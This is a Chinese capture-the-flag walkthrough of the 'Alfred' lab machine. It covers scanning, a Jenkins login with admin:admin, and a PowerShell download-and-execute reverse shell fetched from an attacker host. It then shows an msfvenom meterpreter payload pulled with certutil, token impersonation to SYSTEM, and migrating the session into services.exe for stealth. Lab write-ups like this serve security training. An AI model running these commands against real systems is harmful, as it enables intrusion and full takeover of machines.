# Alfred

nmap扫描

```shell
sudo nmap -sT --min-rate 10000 -p- 10.10.32.178 -Pn

PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

sudo nmap -sT -sV -sC -O -p80,3389,8080 10.10.32.178 -Pn

PORT     STATE SERVICE        VERSION
80/tcp   open  http           Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ms-wbt-server?
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2025-05-04T06:16:24
|_Not valid after:  2025-11-03T06:16:24
|_ssl-date: 2025-05-05T06:29:52+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2025-05-05T06:29:47+00:00
8080/tcp open  http           Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
```

80和8080端口上都运行着一个web服务

打开发现8080端口上是一个Jenkins的登陆页面

尝试使用弱密码登录

```tex
admin:admin
```

然后在/job/project/configure目录下找到一个允许执行命令的功能

设置好监听端口，启动好服务器，尝试getshell

```shell
sudo nc -lvnp 4444

python -m http.server 5555

powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

成功getshell,尝试提权

为了更好的提权，我们改使用meterpreter

```shell
#生成一个反向shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe

#下载
certutil -urlcache -f http://<you IP>:8000/shell-name.exe shell-name.exe

#设置监听
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run

#运行反向shell
.\shell-name.exe
```

查看权限

```shell
whoami /priv

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeDebugPrivilege                Debug programs                            Enabled 
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
```

让我们使用incognito模块来利用这个漏洞

```tex
Metasploit 的 Incognito 是 Metasploit 框架中的一个扩展模块，专门用于模拟和滥用 Windows 系统中的令牌（Token） impersonation（令牌窃取/假冒）技术。

Incognito 的核心功能
令牌窃取（Token Stealing）

允许攻击者假冒其他用户的身份（如管理员或高权限用户），利用现有的令牌绕过身份验证。

例如，通过窃取一个已登录的域管理员令牌，攻击者可以访问域内其他系统。

权限提升（Privilege Escalation）

通过假冒高权限令牌（如 SYSTEM 或管理员），将当前会话的权限提升至更高级别。

横向移动（Lateral Movement）

在已攻陷的机器上，利用窃取的令牌访问网络中的其他主机（如通过 psexec 或 wmi）。
```

```shell
#加载该模块
load incognito

#检查哪些令牌可用
list_tokens -g

BUILTIN\Administrators
BUILTIN\Users

#模拟管理员令牌
impersonate_token "BUILTIN\Administrators"

getuid

NT AUTHORITY\SYSTEM
```

成功拿到管理员权限



**“请确保你将 Meterpreter 会话迁移（migrate）到一个具有合适权限的进程中。最安全的选择是迁移到 `services.exe` 进程。具体步骤如下：**

1. **先用 `ps` 命令查看当前运行的进程，找到 `services.exe` 的 PID（进程ID）。**
2. **然后使用 `migrate PID-OF-PROCESS` 命令将会话迁移到该进程中。”**

### **详细解释**

1. **为什么要迁移进程？**
   - Meterpreter 默认可能运行在容易被杀毒软件检测或意外终止的进程（如 `explorer.exe`）。
   - 迁移到更稳定的系统进程（如 `services.exe`）可以增强隐蔽性和持久性。
2. **为什么选 `services.exe`？**
   - 它是 Windows 的核心系统进程，通常具有 `SYSTEM` 权限，适合后续提权操作。
   - 该进程一般不会退出，能保持会话稳定。

**操作步骤示例（在 Meterpreter 中）**

```
# 1. 列出所有进程，找到 services.exe 的 PID
ps

# 2. 迁移到 services.exe（假设 PID 为 1234）
migrate 1234
```